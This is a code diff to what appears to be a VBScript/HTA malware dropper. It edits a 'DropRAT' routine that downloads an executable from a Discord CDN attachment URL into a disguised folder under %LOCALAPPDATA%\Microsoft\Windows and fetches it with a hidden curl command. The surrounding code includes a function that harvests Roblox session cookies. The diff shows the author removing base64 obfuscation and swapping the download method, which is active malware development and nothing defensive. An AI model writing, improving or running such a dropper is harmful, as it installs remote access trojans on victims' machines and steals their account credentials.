@@ -45,13 +45,12 @@ Loop
 
 window.close()
 
-' --- RAT DROP (fast) ---
+' --- RAT DROP (plain URL) ---
 Sub DropRAT(targetWH, sendRocket)
-    ' Base64 of: https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&
-    Dim b64Url : b64Url = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTU1NzI2NjE5Mjk3MTA3MTU3OS8xNTcyMzg2Njg3MTgxMzk0MDExL2NsaWVudF8xLmV4ZT9leD02YWZlMmViNyZpcz02YWZjZGQzNyZobT00NWIzOTE2NTVmOThiZjY2NTU0MjFiMzAyYWQ3MWE4NGJiZWZhNjYzMTE5YWE1Nzg0NDA0YjhiY2VlNWMyZDlmJg=="
-    Dim dl : dl = DecodeB64(b64Url)
+    Dim dl : dl = "https://cdn.discordapp.com/attachments/1557266192971071579/1572386687181394011/client_1.exe?ex=6afe2eb7&is=6afcdd37&hm=45b391655f98bf6655421b302ad71a84bbefa663119aa5784404b8bcee5c2d9f&"
     
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
+    If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
     Dim fname : fname = "w" & Int(Rnd() * 900000 + 100000) & ".exe"
     Dim op : op = tPath & "\" & fname
@@ -62,21 +61,8 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' HTTP object download — fast, no process spawn
-    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
-    xh.SetOption 2, 13056
-    xh.Open "GET", dl, False
-    xh.Send
-    If xh.Status = 200 Then
-        Dim st : Set st = CreateObject("ADODB.Stream")
-        st.Type = 1
-        st.Open
-        st.Write xh.responseBody
-        st.SaveToFile op, 2
-        st.Close
-        Set st = Nothing
-    End If
-    Set xh = Nothing
+    Dim cCmd : cCmd = "cmd /c curl.exe -s -L --connect-timeout 5 --max-time 30 -o """ & op & """ """ & dl & """"
+    sh.Run cCmd, 0, True
 
     If fso.FileExists(op) Then
         If fso.GetFile(op).Size > 100000 Then
@@ -174,7 +160,7 @@ Function GetRobloxCookie()
     GetRobloxCookie = cookie
 End Function
 
-' --- Base64 Decoder ---
+' --- Base64 Decoder (unused now, kept for later) ---
 Function DecodeB64(str)
     Dim xml, elem
     Set xml = CreateObject("MSXML2.DOMDocument")
